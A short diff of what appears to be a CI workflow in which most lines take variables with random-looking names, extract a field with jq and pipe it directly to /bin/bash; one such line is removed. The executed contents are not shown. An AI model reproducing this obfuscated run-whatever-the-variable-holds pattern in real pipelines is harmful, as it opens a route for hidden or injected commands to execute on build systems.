@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$kbgp713" | jq -r .cez03 | /bin/bash
           echo $nwhmu3 | jq -r .olckk905 | /bin/bash
           printf '%s' "$sym7500" | jq -r .megx680 | /bin/bash
-          echo $drt676 | jq -r .aprqq15384 | /bin/bash
           echo $e4 | jq -r .qdmh9 | /bin/bash
           printf '%s' "$tsp1954" | jq -r .nkprp57365 | /bin/bash
           echo $pqgbx19 | jq -r .uf56 | /bin/bash
